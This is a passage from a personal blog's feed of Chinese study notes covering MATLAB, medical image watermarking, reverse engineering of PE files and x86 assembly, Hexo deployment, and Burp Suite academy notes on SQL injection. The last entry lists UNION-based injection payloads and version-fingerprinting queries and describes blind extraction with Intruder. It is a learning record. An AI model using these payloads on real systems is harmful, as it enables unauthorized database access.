j。</p><pre><code>c = [3+4i, 4+3j; -i, 10j]c = 2×2 complex</code></pre><hr><p><code>clc</code></p><hr><blockquote><p>每个变量都是一个可包含许多数字的数组</p></blockquote><hr><p>引用数组中的特定元素有两种方法。最常见的方法是指定行和列下标，例如<br><code>A(4,2)</code><br>另一种方法不太常用，但有时非常有用，即使用单一下标按顺序向下遍历每一列：<br><code>A(8)</code><br>可以在赋值语句左侧指定当前维外部的元素。数组大小会增大以便容纳新元素。<br><code>A(4,5) = 17</code></p><hr><p>要引用多个数组元素，请使用冒号运算符，这使您可以指定一个格式为<code>start:end</code>的范围。例如，列出 A 前三行及第二列中的元素：<br><code>A(1:3,2)</code><br>单独的冒号（没有起始值或结束值）指定该维中的所有元素。例如，选择 A 第三行中的所有列：<br><code>A(3,:)</code></p><hr><p>冒号运算符还允许您使用较通用的格式<code>start: step :end</code>创建等距向量值。如果省略中间的步骤（如 <code>start:end</code> 中），MATLAB 会使用默认步长值 1。<br><code>B = 0:10:100</code></p><hr><p>退出 MATLAB 后，工作区变量不会保留。使用<code>save</code>命令保存数据以供将来使用，<br><code>save myfile.mat</code><br>要清除工作区中的所有变量，请使用<code>clear</code>命令。<br>使用 load 将 MAT 文件中的数据还原到工作区。<br><code>load myfile.mat</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;a = [1 2 3 4]&lt;/code&gt;&lt;br&gt;创建矩阵的另一种方法是使用 ones、zeros 或 rand 等函数。例如，创建一个由零组成的 5×1 列向量。&lt;br&gt;&lt;code&gt;z = zeros(5,1)&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;MATLAB 允许您使用单一的算术运算符或函数来处理矩阵中的所有值。&lt;br&gt;&lt;code&gt;a + 10&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
    
      <category term="matlab" scheme="http://finsenty54.github.io/tags/matlab/"/>
    
  </entry>
  
  <entry>
    <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记4</title>
    <link href="http://finsenty54.github.io/2020/01/28/Medical%20Image%20WatermarkingTechniques%20and%20Applications%3E%3E%E7%AC%94%E8%AE%B04/"/>
    <id>http://finsenty54.github.io/2020/01/28/Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记4/</id>
    <published>2020-01-28T10:45:56.000Z</published>
    <updated>2020-01-29T07:35:45.871Z</updated>
    
    <content type="html"><![CDATA[<p>orthonormal matrices  正交矩阵<br>a  message  can  be  hidden  in  cover document   if   the   content   of   the   document   hashigh redundancy.<br>propose  a  new  reliable  method  by hiding  the  encrypted  watermark  in  the  RONI  part  of  the medical   image   using   DWT   approach.<br>ROI Based Medical Image Watermarking with Zero Distortion and Enhanced Security 所读论文</p><p>直方图均衡化（Histogram Equalization）<br><a id="more"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;orthonormal matrices  正交矩阵&lt;br&gt;a  message  can  be  hidden  in  cover document   if   the   content   of   the   document   hashigh redundancy.&lt;br&gt;propose  a  new  reliable  method  by hiding  the  encrypted  watermark  in  the  RONI  part  of  the medical   image   using   DWT   approach.&lt;br&gt;ROI Based Medical Image Watermarking with Zero Distortion and Enhanced Security 所读论文&lt;/p&gt;
&lt;p&gt;直方图均衡化（Histogram Equalization）&lt;br&gt;
    
    </summary>
    
    
      <category term="watermark" scheme="http://finsenty54.github.io/tags/watermark/"/>
    
  </entry>
  
  <entry>
    <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记3</title>
    <link href="http://finsenty54.github.io/2020/01/25/Medical%20Image%20WatermarkingTechniques%20and%20Applications%3E%3E%E7%AC%94%E8%AE%B03/"/>
    <id>http://finsenty54.github.io/2020/01/25/Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记3/</id>
    <published>2020-01-25T07:21:36.000Z</published>
    <updated>2020-01-29T07:29:13.842Z</updated>
    
    <content type="html"><![CDATA[<p>There  are  a  wide  variety  of  popular  wavelet  algorithms,  including  Daubechies  wavelets,  Mexican  Hat  wavelets  and  Morlet  wavelets </p><p>HAAR</p><p>In addition, the Haar wavelet transform is fast, memory efficient and  exactly  reversible  without  the  edge  effects  that  are  present  in  other  wavelet  transforms.</p><p>the water-mark can be embedded into the other three sub-bands (HL, LH and HH sub-band) to  maintain  better  image  quality.<br><a id="more"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;There  are  a  wide  variety  of  popular  wavelet  algorithms,  including  Daubechies  wavelets,  Mexican  Hat  wavelets  and  Morlet  wavelets &lt;/p&gt;
&lt;p&gt;HAAR&lt;/p&gt;
&lt;p&gt;In addition, the Haar wavelet transform is fast, memory efficient and  exactly  reversible  without  the  edge  effects  that  are  present  in  other  wavelet  transforms.&lt;/p&gt;
&lt;p&gt;the water-mark can be embedded into the other three sub-bands (HL, LH and HH sub-band) to  maintain  better  image  quality.&lt;br&gt;
    
    </summary>
    
    
      <category term="watermark" scheme="http://finsenty54.github.io/tags/watermark/"/>
    
  </entry>
  
  <entry>
    <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记2</title>
    <link href="http://finsenty54.github.io/2020/01/23/Medical%20Image%20WatermarkingTechniques%20and%20Applications%3E%3E%E7%AC%94%E8%AE%B02/"/>
    <id>http://finsenty54.github.io/2020/01/23/Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记2/</id>
    <published>2020-01-23T05:37:04.000Z</published>
    <updated>2020-01-23T05:46:12.002Z</updated>
    
    <content type="html"><![CDATA[<p>state-of-the-art 最先进的<br>Error Correcting Codes  ECC<br>discrete wavelet transform (DWT) 离散小波变换<br>The  ECC  based  watermarking  methods  attempt  to  find  a  trade-off  between the number of bits to be embedded and the number of bit-errors that can be corrected.  </p><p>the  technique  embeds  medical  text  watermarks  into  selected  sub-band  of  discrete wavelet transform (DWT) cover medical image coefficients using spread-spectrum technique.该技术使用扩展频谱技术将医学文本水印嵌入离散小波变换（DWT）覆盖医学图像系数的选定子带中。</p><p> <strong>Any  image  com-prises of two sections called ROI and NROI </strong><br><a id="more"></a><br> ROI is an area that has sensi-tive data, so it cannot be allowed to be modified because most of the information is  present  in  this  area  [105].  NROI  is  an  area  of  image  that  does  not  have  an  important  data  i.e.  background  of  image.<br> The  spatial  domain  tech-niques such as LSB substitutions, correlation-based, spread-spectrum and Patchwork are straight forward and computationally simple.<br> In the transform domain techniques, the data is embedded by modulating the coefficients of a transform discrete wavelet transform  (DWT),  discrete  cosine  transform  (DCT),  singular  value  decomposition  (SVD) and discrete Fourier transform (DFT).<br>finite energy function 有限能量函数</p><p>在数位信号处理领域中，降采样，又作减采集,是一种多速率数字信号处理的技术或是降低信号采样率的过程，通常用于降低数据传输速率或者数据大小。<br>降采样因子（常用表示符号为＂M＂）一般是大于１的整数或有理数。<br>这个因子表达采样周期变成原来的M倍，或者等价表示采样率变成原来的1/M倍。 采样率的降低会造成频谱的压缩，因此需要利用滤波器确保在较低的采样频率下不发生混叠，确保奈奎式采样定理依旧成立。</p><p>形式幂级数上的一个重要映射是系数的提取操作：将一个形式幂级数映射到它的X^n的系数。这个操作常常记作[X^n]，</p><p>以一变数为t 的函数 f(t) 为例，f(t) 经过一积分转换T 得到Tf(u)：<br>其中 K 是个确定的二元函数, 称为此积分变换的核函数（kernel function）或核（nucleus）。当选取不同的积分域和变换核时，就得到不同名称的积分变换。f(t) 称为象原函数，Tf(u) 称为 f(t) 的象函数，在一定条件下，它们是一一对应而变换是可逆的。</p><p>定义在实数域上的实函数相对于值c的n阶矩为:</p><p>如果f(x)是概率密度函数，则容易看出相对于值0的1阶矩是连续随机变量的数学期望。</p><p>vanishing moment</p><p>母小波定义为<br><img src="https://s2.ax1x.com/2020/01/23/1EbUyt.png" alt="1EbUyt.png"><br>其中a是缩放因子，当|a|&lt;1时，母小波被压缩，在时间轴上有较小的支撑度，并且对应到高频，因为母小波变窄、变化变快， 反之，当|a|&gt;1时，母小波变宽、变化较慢，所以对应到低频。b则是平移参数，用来决定母小波的位置。<br>小波分析（英语：wavelet analysis）或小波变换（英语：wavelet transform）是指用有限长或快速衰减的“母小波”（mother wavelet）的振荡波形来表示信号。该波形被缩放和平移以匹配输入的信号。<br>在信号处理中，窗函数（英语：window function）是一种除在给定区间之外取值均为0的实函数。譬如：在给定区间内为常数而在区间外为0的窗函数被形象地称为矩形窗。任何函数与窗函数之积仍为窗函数，所以相乘的结果就像透过窗口“看”其他函数一样</p><p>变换(Transform)、量化(Quantization)和编码(Coding)[<br>另外，当输入信号为二维时（例如：影像），短时距傅里叶变换的输出为四维度，但小波变换仍是二维信号，所以在影像处理上通常会使用小波变换而非短时距傅里叶变<br>换。</p><p>ΣΣ 这是二重求和符号<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i=m j=n</span><br><span class="line">..Σ... Σ . . . . ai bj = a1b1+a1b2+ . . . +a1bn+</span><br><span class="line">i=<span class="number">1</span> j=<span class="number">1</span> . . . . . . .+a2b1+a2b2+ . . . +a2bn+</span><br><span class="line">. . . . . .. . . . . . . . . . +. . . . +</span><br><span class="line">. . . . . . . . . . . . . . . .+amb1+amb2+ . . . . +ambn.</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;state-of-the-art 最先进的&lt;br&gt;Error Correcting Codes  ECC&lt;br&gt;discrete wavelet transform (DWT) 离散小波变换&lt;br&gt;The  ECC  based  watermarking  methods  attempt  to  find  a  trade-off  between the number of bits to be embedded and the number of bit-errors that can be corrected.  &lt;/p&gt;
&lt;p&gt;the  technique  embeds  medical  text  watermarks  into  selected  sub-band  of  discrete wavelet transform (DWT) cover medical image coefficients using spread-spectrum technique.该技术使用扩展频谱技术将医学文本水印嵌入离散小波变换（DWT）覆盖医学图像系数的选定子带中。&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;Any  image  com-prises of two sections called ROI and NROI &lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="watermark" scheme="http://finsenty54.github.io/tags/watermark/"/>
    
  </entry>
  
  <entry>
    <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记1</title>
    <link href="http://finsenty54.github.io/2020/01/21/Medical%20Image%20WatermarkingTechniques%20and%20Applications%3E%3E%E7%AC%94%E8%AE%B01/"/>
    <id>http://finsenty54.github.io/2020/01/21/Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记1/</id>
    <published>2020-01-21T11:30:44.000Z</published>
    <updated>2020-01-21T11:33:29.920Z</updated>
    
    <content type="html"><![CDATA[<ol><li>the  water-mark robustness is the key performance parameter.</li><li>a  watermark  can  be  embedded  in  every  frame.  </li><li>watermarking that pro-tects the content even after decryption<a id="more"></a></li><li>due  to  higher  data  embedding  capacity of image,</li><li>visible watermark is a secondary translu-cent  overlaid  into  the  primary  image. </li><li>Dual watermark is a combination of a visible and an invisible watermark </li><li>the  watermarking  system  consists  of  two  processes  -  encoding  and  extraction  process<br><img src="https://s2.ax1x.com/2020/01/21/1kQhQA.png" alt></li></ol><p>lossy compression 有损压缩<br>steganography  隐写术<br>obustness 健壮性<br>exponentially 指数地<br>archiving 存档<br>geometrical 几何<br>Classification 分类<br>Spatial 空间的<br>cryptography 密码学<br>pixel 像素点 [ˈpɪksl]<br>designated  特定的<br>confidentiality 保密<br>on  account of 由于<br>Tamper 篡改<br>confidentiality 机密性</p>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;the  water-mark robustness is the key performance parameter.&lt;/li&gt;
&lt;li&gt;a  watermark  can  be  embedded  in  every  frame.  &lt;/li&gt;
&lt;li&gt;watermarking that pro-tects the content even after decryption
    
    </summary>
    
    
      <category term="watermark" scheme="http://finsenty54.github.io/tags/watermark/"/>
    
  </entry>
  
  <entry>
    <title>《逆向工程核心原理》学习笔记4</title>
    <link href="http://finsenty54.github.io/2019/11/29/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B04/"/>
    <id>http://finsenty54.github.io/2019/11/29/《逆向工程核心原理》学习笔记4/</id>
    <published>2019-11-29T08:05:04.000Z</published>
    <updated>2019-11-29T08:12:54.684Z</updated>
    
    <content type="html"><![CDATA[<p>在PE文件中找到什么，在内存同样可以找到</p><h5 id="PE文件组成"><a href="#PE文件组成" class="headerlink" title="PE文件组成"></a>PE文件组成</h5><pre><code>DOS header DOS stubPE file headerImage Optional HeaderSection tableData DirectoriesSections</code></pre><a id="more"></a><p>PE header 通常位于[imagebase]~[imagebase+1000]<br>memory double click</p><p>改变PE entry point 以跳过一些代码<br>binary fill with nops<br>PE header通常大小是1000h</p><p>EAT 库用来方便其他程序使用函数</p><h5 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h5><p>弹出消息框的地方，pased， alt+f9  , 再点消息框（80%的情况下有用）<br>在memory窗口下搜索，内存中的数据<br>find reference </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在PE文件中找到什么，在内存同样可以找到&lt;/p&gt;
&lt;h5 id=&quot;PE文件组成&quot;&gt;&lt;a href=&quot;#PE文件组成&quot; class=&quot;headerlink&quot; title=&quot;PE文件组成&quot;&gt;&lt;/a&gt;PE文件组成&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;DOS header 
DOS stub
PE file header
Image Optional Header
Section table
Data Directories
Sections
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>《逆向工程核心原理》学习笔记3</title>
    <link href="http://finsenty54.github.io/2019/11/21/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B03/"/>
    <id>http://finsenty54.github.io/2019/11/21/《逆向工程核心原理》学习笔记3/</id>
    <published>2019-11-21T12:44:21.000Z</published>
    <updated>2019-11-21T12:48:27.861Z</updated>
    
    <content type="html"><![CDATA[<ol><li>windows程序运行在Ring 3级，但要运行在内核级（Ring 0），使用API请求，API存储在dll中</li><li>FFFFFFFF==-1</li><li>双击可改变FLAG 寄存器值<a id="more"></a></li><li>双击EIP回去 in ollydbg</li><li>info 从一个API中返回总在EAX中</li><li>PE文件。内存节区头要在各自最小基本单位的倍数上，所以使用NULL填充</li><li>RVA+imageBase==VA(绝对地址）</li><li>PE头内部使用RVA</li><li>4D5A =,,,MZ （PE文件开头，IMAGE_DOS_HEADER)</li><li>INTEL 小端序：：e_lfanew==000000E0</li><li>32位EXE ImageBase == 00400000</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;windows程序运行在Ring 3级，但要运行在内核级（Ring 0），使用API请求，API存储在dll中&lt;/li&gt;
&lt;li&gt;FFFFFFFF==-1&lt;/li&gt;
&lt;li&gt;双击可改变FLAG 寄存器值
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>bug</title>
    <link href="http://finsenty54.github.io/2019/11/20/bug/"/>
    <id>http://finsenty54.github.io/2019/11/20/bug/</id>
    <published>2019-11-20T12:25:45.000Z</published>
    <updated>2019-11-20T12:29:19.438Z</updated>
    
    <content type="html"><![CDATA[<ol><li>修复了发布时间超前的问题<br>–在配置文件中将时区修改为<code>Asia/Shanghai</code><br><del>2019-11-20 20:28:32 星期三</del></li></ol><a id="more"></a>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;修复了发布时间超前的问题&lt;br&gt;–在配置文件中将时区修改为&lt;code&gt;Asia/Shanghai&lt;/code&gt;&lt;br&gt;&lt;del&gt;2019-11-20 20:28:32 星期三&lt;/del&gt;&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
      <category term="bug" scheme="http://finsenty54.github.io/tags/bug/"/>
    
  </entry>
  
  <entry>
    <title>《逆向工程核心原理》学习笔记2</title>
    <link href="http://finsenty54.github.io/2019/11/20/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02/"/>
    <id>http://finsenty54.github.io/2019/11/20/《逆向工程核心原理》学习笔记2/</id>
    <published>2019-11-20T12:02:41.000Z</published>
    <updated>2019-11-20T13:05:34.766Z</updated>
    
    <content type="html"><![CDATA[<ol><li>栈就是一小段内存空间，大小记录在PE头中</li><li>RETN 8 =RETN POP 8 stdcall清理方式 被调用者清理，cdecl调用者清理</li><li>Nags 唠叨</li><li>VB ThunRTMain 函数 调用消息框 rtcMsgBox<a id="more"></a></li><li>Set Breakpoint on every call to rtcMsgBox</li><li>1 opcode == 1 byte</li><li>4 bytes == 1 dword</li><li>registers is 32 bit</li></ol><hr><h5 id="Lena视频学习"><a href="#Lena视频学习" class="headerlink" title="Lena视频学习"></a>Lena视频学习</h5><p><em>这是书本介绍的，这是<a href="https://tuts4you.com/download/2876/" title="tuts4you" target="_blank" rel="noopener">tuts4you</a>crackme下载地址，里面还有视频教程和一些其他教程。</em></p><h5 id="Assembler-The-Basics-In-Reversing"><a href="#Assembler-The-Basics-In-Reversing" class="headerlink" title="Assembler : The Basics In Reversing"></a>Assembler : The Basics In Reversing</h5><p>SS stack segment<br>C-Flag &gt;FFFFFFFF  and &lt;0 时设置<br><code>segmens(a page in a book) + offsets(a specific line on that page)</code></p><pre><code>add eax,ebx                    ;; Register, Registeradd eax,123                    ;; Register, Valueadd eax,dword ptr [404000]            ;; Register, Dword Pointer [value]add eax,dword ptr [eax]            ;; Register, Dword Pointer [register]add eax,dword ptr [eax+00404000]    ;; Register, Dword Pointer [register+value]add dword ptr [404000],eax            ;; Dword Pointer [value], Registeradd dword ptr [404000],123        ;; Dword Pointer [value], Valueadd dword ptr [eax],eax            ;; Dword Pointer [register], Registeradd dword ptr [eax],123            ;; Dword Pointer [register], Valueadd dword ptr [eax+404000],eax        ;; Dword Pointer [register+value], Registeradd dword ptr [eax+404000],123        ;; Dword Pointer [register+value], value</code></pre><p>INT3 and INTO are interrupt calls that take no parameters but call the handlers for interrupts 3 and 4, respectively.</p><pre><code>JA*    -    Jump if (unsigned) above            - CF=0 and ZF=0JAE    -    Jump if (unsigned) above or equal        - CF=0JB*    -    Jump if (unsigned) below            - CF=1JBE    -    Jump if (unsigned) below or equal        - CF=1 or ZF=1JC    -    Jump if carry flag set            - CF=1JCXZ    -    Jump if CX is 0                - CX=0JE**    -    Jump if equal                    - ZF=1JECXZ    -    Jump if ECX is 0                - ECX=0JG*    -    Jump if (signed) greater            - ZF=0 and SF=OF (SF = Sign Flag)JGE*    -    Jump if (signed) greater or equal        - SF=OFJL*    -    Jump if (signed) less                - SF != OF (!= is not)JLE*    -    Jump if (signed) less or equal        - ZF=1 and OF != OFJMP**    -    Jump                        - Jumps alwaysJNA    -    Jump if (unsigned) not above        - CF=1 or ZF=1JNAE    -    Jump if (unsigned) not above or equal    - CF=1JNB    -    Jump if (unsigned) not below        - CF=0JNBE     -    Jump if (unsigned) not below or equal    - CF=0 and ZF=0JNC    -    Jump if carry flag not set            - CF=0JNE**    -    Jump if not equal                - ZF=0JNG    -    Jump if (signed) not greater            - ZF=1 or SF!=OFJNGE    -    Jump if (signed) not greater or equal    - SF!=OFJNL    -    Jump if (signed) not less            - SF=OFJNLE    -    Jump if (signed) not less or equal        - ZF=0 and SF=OFJNO    -    Jump if overflow flag not set        - OF=0JNP    -    Jump if parity flag not set            - PF=0JNS    -    Jump if sign flag not set            - SF=0JNZ    -    Jump if not zero                - ZF=0JO    -    Jump if overflow flag is set            - OF=1JP    -    Jump if parity flag set            - PF=1JPE    -    Jump if parity is equal            - PF=1JPO    -    Jump if parity is odd                - PF=0JS    -    Jump if sign flag is set            - SF=1JZ    -    Jump if zero                    - ZF=1</code></pre><h6 id="LEA-Load-Effective-Address"><a href="#LEA-Load-Effective-Address" class="headerlink" title="LEA (Load Effective Address)"></a>LEA (Load Effective Address)</h6><p>Syntax: LEA dest,src<br>LEA can be treated the same way as the MOV instruction. It isn’t used too much for its original function, but more for quick multiplications like this:<br>   <code>lea eax, dword ptr [4*ecx+ebx]</code><br> <strong>which gives eax the value of 4*ecx+ebx</strong><br><del>ptr== pointer</del></p><h6 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h6><p>Syntax: POP dest<br>POP loads the value of byte/word/dword ptr <strong>[esp] jian接寻址 esp指向的值zuo wei dizhi</strong>and puts it into dest. </p><h6 id="TEST"><a href="#TEST" class="headerlink" title="TEST"></a>TEST</h6><p>Syntax: TEST operand1, operand2<br>This instruction is in 99% of all cases used for “TEST EAX, EAX”. It performs a Logical<br>AND(AND instruction)<code>but does not save the values</code>.<strong> It only sets the Z-Flag, when EAX is 0 or clears it, when EAX is not 0. The O/C flags are always cleared.</strong></p><h6 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h6><p>Syntax: XOR dest,src<br>The XOR instruction connects two values using logical exclusive OR (remember OR uses inclusive OR).<br><code>This instruction clears the O-Flag and the C-Flag and can set the Z-Flag.</code><br>To understand XOR better, consider those two binary values:</p><pre><code>10010101100101001101</code></pre><p><code>If you XOR them, the result is 1100011011</code></p><p>The most often seen use of XOR is “XOR, EAX, EAX”.<code>This will set EAX to 0,</code> because when you XOR a value with itself, the result is always 0. I hope you understand why, else<br>write down a value on paper and try ;)</p>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;栈就是一小段内存空间，大小记录在PE头中&lt;/li&gt;
&lt;li&gt;RETN 8 =RETN POP 8 stdcall清理方式 被调用者清理，cdecl调用者清理&lt;/li&gt;
&lt;li&gt;Nags 唠叨&lt;/li&gt;
&lt;li&gt;VB ThunRTMain 函数 调用消息框 rtcMsgBox
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>《逆向工程核心原理》学习笔记1</title>
    <link href="http://finsenty54.github.io/2019/11/19/%E3%80%8A%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/"/>
    <id>http://finsenty54.github.io/2019/11/19/《逆向工程核心原理》学习笔记1/</id>
    <published>2019-11-19T15:06:56.000Z</published>
    <updated>2019-11-19T15:18:42.530Z</updated>
    
    <content type="html"><![CDATA[<p>买这本书有一年了，但只看了一点点，希望能学完</p><ol><li>保存更改到可执行文件，<em>1保存到COPY TO EXECUTABLE FILE</em>，<em>2选择SAVE FILE</em></li><li>应用程序被加载到内存时，有一最小分配空间</li><li>space = assemble，用于更改代码<a id="more"></a></li><li>大端序 12 34 </li><li>小端序 34 12 一个字节里顺序一样</li><li>逆序压栈，栈FILO</li><li>栈窗口，address-relative to EBP</li><li>EBP ESP 存储的是栈地址-》代表数据</li><li>1.CALL 压入下一地址 -1 2.PUSH 压入上一栈帧基地址 -1 3.MOV EBP ESP 4. MOV ESP EBP 5.POP EBP 取出基地址 +1 6.RETN 取出下一地址+1</li><li>local 局部变量 ARG 参数</li><li>test = and =0 则 ZF=1 JE ZF=1 跳转</li><li>局部对象存储在栈区</li><li>选中地址，Follow in dump</li><li>dump中，long-address with ASCII dump</li><li>VB使用unicode</li><li>API get…Text</li><li>调试前预测代码的实现</li><li>先上托，找到栈帧生成部分</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;买这本书有一年了，但只看了一点点，希望能学完&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;保存更改到可执行文件，&lt;em&gt;1保存到COPY TO EXECUTABLE FILE&lt;/em&gt;，&lt;em&gt;2选择SAVE FILE&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;应用程序被加载到内存时，有一最小分配空间&lt;/li&gt;
&lt;li&gt;space = assemble，用于更改代码
    
    </summary>
    
    
      <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>在新电脑上重新部署hexo</title>
    <link href="http://finsenty54.github.io/2019/11/19/%E5%9C%A8%E6%96%B0%E7%94%B5%E8%84%91%E4%B8%8A%E9%87%8D%E6%96%B0%E9%83%A8%E7%BD%B2hexo/"/>
    <id>http://finsenty54.github.io/2019/11/19/在新电脑上重新部署hexo/</id>
    <published>2019-11-19T03:31:43.000Z</published>
    <updated>2019-11-19T06:19:51.580Z</updated>
    
    <content type="html"><![CDATA[<p>近期有了一台新电脑，所以需要重新部署一下hexo，我看了几个教程，其实很简单的，却弄复杂了</p><h4 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1. 前期准备"></a>1. 前期准备</h4><p><a href="https://hexo.io/docs/" title="hexo安装" target="_blank" rel="noopener">hexo安装</a>遵循该页面进行<strong>git</strong>和<strong>nodejs</strong>的安装<br><code>将之前的hexo文件整个拷贝过来</code><br><a id="more"></a></p><h4 id="2-配置SSH"><a href="#2-配置SSH" class="headerlink" title="2. 配置SSH"></a>2. 配置SSH</h4><p>生成rsa公私钥</p><pre><code>$ cd ~/.ssh# Checks to see if there is a directory named &quot;.ssh&quot; in your user directory$ ssh-keygen -t rsa -C &quot;your_email@example.com&quot;# Creates a new ssh key using the provided emailGenerating public/private rsa key pair.Enter file in which to save the key (/home/you/.ssh/id_rsa):</code></pre><p>然后在GitHub里添加公钥，在项目的setting里有一<code>deploy key</code>，在这里添加公钥<br>使用下列命令验证</p><pre><code>ssh -T git@github.com</code></pre><p>如果不行，就是没有在<code>.ssh</code>文件夹里创建，需要接下来的两步</p><pre><code>ssh-agent -sssh-add ~/.ssh/id_rsa</code></pre><p>若提示要输入密码什么的，则在<code>_config.yml</code>配置文件中修改<code>repo</code></p><pre><code>deploy:  type: git  repo: git@github.com:chengjianhua/chengjianhua.github.io.git  branch: master</code></pre><p>这样就可以了，不用<code>npm install</code>或<code>initial</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;近期有了一台新电脑，所以需要重新部署一下hexo，我看了几个教程，其实很简单的，却弄复杂了&lt;/p&gt;
&lt;h4 id=&quot;1-前期准备&quot;&gt;&lt;a href=&quot;#1-前期准备&quot; class=&quot;headerlink&quot; title=&quot;1. 前期准备&quot;&gt;&lt;/a&gt;1. 前期准备&lt;/h4&gt;&lt;p&gt;&lt;a href=&quot;https://hexo.io/docs/&quot; title=&quot;hexo安装&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;hexo安装&lt;/a&gt;遵循该页面进行&lt;strong&gt;git&lt;/strong&gt;和&lt;strong&gt;nodejs&lt;/strong&gt;的安装&lt;br&gt;&lt;code&gt;将之前的hexo文件整个拷贝过来&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="else" scheme="http://finsenty54.github.io/tags/else/"/>
    
  </entry>
  
  <entry>
    <title>burpsuite 安全学院笔记</title>
    <link href="http://finsenty54.github.io/2019/05/17/sql-more-details/"/>
    <id>http://finsenty54.github.io/2019/05/17/sql-more-details/</id>
    <published>2019-05-17T02:33:13.000Z</published>
    <updated>2019-11-19T06:17:16.100Z</updated>
    
    <content type="html"><![CDATA[<p>For a UNION query to work, two key requirements must be met:</p><ol><li><strong>The individual queries must return the same number of columns.</strong></li><li>The data types in each column must be compatible between the individual queries.</li></ol><p>‘ ORDER BY 1–<br>‘ ORDER BY 2–<br>‘ ORDER BY 3–</p><p>‘ UNION SELECT NULL–<br>‘ UNION SELECT NULL,NULL–<br>‘ UNION SELECT NULL,NULL,NULL–<br><a id="more"></a><br>The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.<br>On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called DUAL which can be used for this purpose. So the injected queries on Oracle would need to look like: ‘ UNION SELECT NULL FROM DUAL–.<br>The payloads described use the double-dash comment sequence – to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.</p><p>Database type     Query<br>Microsoft, MySQL     SELECT @@version<br>Oracle     SELECT * FROM v$version<br>PostgreSQL     SELECT version() </p><p>For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the “Cluster bomb” attack type, and work through all permutations of offsets and character values. </p><p>Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The “Status” column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position. </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;For a UNION query to work, two key requirements must be met:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;The individual queries must return the same number of columns.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;The data types in each column must be compatible between the individual queries.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;‘ ORDER BY 1–&lt;br&gt;‘ ORDER BY 2–&lt;br&gt;‘ ORDER BY 3–&lt;/p&gt;
